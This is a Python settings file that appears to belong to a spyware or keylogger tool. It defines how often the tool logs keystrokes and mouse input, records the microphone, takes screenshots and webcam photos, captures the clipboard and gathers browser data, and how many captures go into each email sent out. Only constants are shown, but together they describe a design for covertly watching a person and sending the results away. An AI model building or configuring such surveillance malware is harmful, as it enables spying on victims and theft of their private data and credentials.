from platform import system
from tempfile import gettempdir
from os.path import join
# COMMON
LOGS_DIRECTORY_PATH = None # Feel free to put a custom path here. This is not required.
if LOGS_DIRECTORY_PATH is None:
    default_logs_directory = join(gettempdir(), 'logs')
    LOGS_DIRECTORY_PATH = default_logs_directory
print(LOGS_DIRECTORY_PATH)
# INPUT
INPUT_LOGS_PER_EMAIL = 10000 # Number of times the mouse/keyboard are logged before an email is sent

# MICROPHONE
MICROPHONE_INTERVAL = 60 # Length of each microphone recording (in seconds)
MICROPHONE_RECORDINGS_PER_EMAIL = 300 # How many recordings to record before sending an email

# SCREEN
SCREENSHOT_INTERVAL = 60 # Time in seconds before each screenshot
SCREENSHOTS_PER_EMAIL = 300 # How many screenshots to take before an email is sent

# WEBCAM
WEBCAM_INTERVAL = 60 # Time in seconds before each picture 
PICTURES_PER_EMAIL = 300 # How many pictures to take before an email is sent

# CLIPBOARD
CLIPBOARD_INTERVAL = 500 # time in seconds before the clipboard is logged
PASTES_PER_EMAIL = 20 # How many times the clipboard is logged before an email is sent

# BROWSER
BROWSER_INTERVAL = 20000
BROWSER_LOGS_PER_EMAIL = 1
# TODO: other constants
